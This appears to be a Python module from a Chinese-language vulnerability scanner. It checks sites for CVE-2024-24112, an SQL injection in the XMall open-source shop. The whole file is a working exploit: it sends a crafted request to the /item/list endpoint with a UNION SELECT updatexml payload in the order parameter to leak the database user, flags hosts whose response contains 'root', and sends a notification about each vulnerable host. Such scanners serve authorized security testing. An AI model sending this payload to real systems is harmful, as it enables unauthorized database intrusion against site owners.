# 131.XMall开源商城SQL注入漏洞(CVE-2024-24112)

from Modules import ServerJ
from Common.Common_Request import common_request

bugName = 'XMall 开源商城 SQL注入漏洞(CVE-2024-24112)'


def scan_XMall_Open_Marketplace_SQL_Injection(url, proxies, append_to_output, serverJ_key, bugName):
    path = "/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136"
    headers = {
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,or;q=0.7",
        "Connection": "close",
    }
    response = common_request(url, path, headers, method='GET', timeout=20, proxies=proxies,
                                 append_to_output=append_to_output)
    if response is not None:
        if response.status_code == 200 and "root" in response.text:
            append_to_output(f"[+] {url} 存在{bugName}！！！！", "red")
            ServerJ.sc_send(bugName, f"漏洞连接: {url}\r ", ServerJ_Key=serverJ_key)
        else:
            append_to_output(f"[-] {url} 不存在{bugName}", "green")